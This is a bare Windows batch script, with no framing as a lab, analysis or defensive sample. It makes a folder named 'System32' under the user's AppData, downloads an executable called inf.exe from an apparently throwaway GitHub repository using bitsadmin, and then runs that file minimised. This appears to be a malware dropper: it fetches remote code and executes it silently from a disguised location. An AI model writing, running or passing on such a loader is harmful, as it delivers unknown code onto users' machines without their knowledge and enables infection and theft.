@echo off
if not exist "%APPDATA%\Roaming\System32" (
    mkdir "%APPDATA%\Roaming\System32"
)
bitsadmin /transfer mydownloadjob /download /priority high "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/inf.exe" "%APPDATA%\Roaming\System32\inf.exe"
timeout /t 10 /nobreak
start /min "" "%APPDATA%\Roaming\System32\inf.exe"
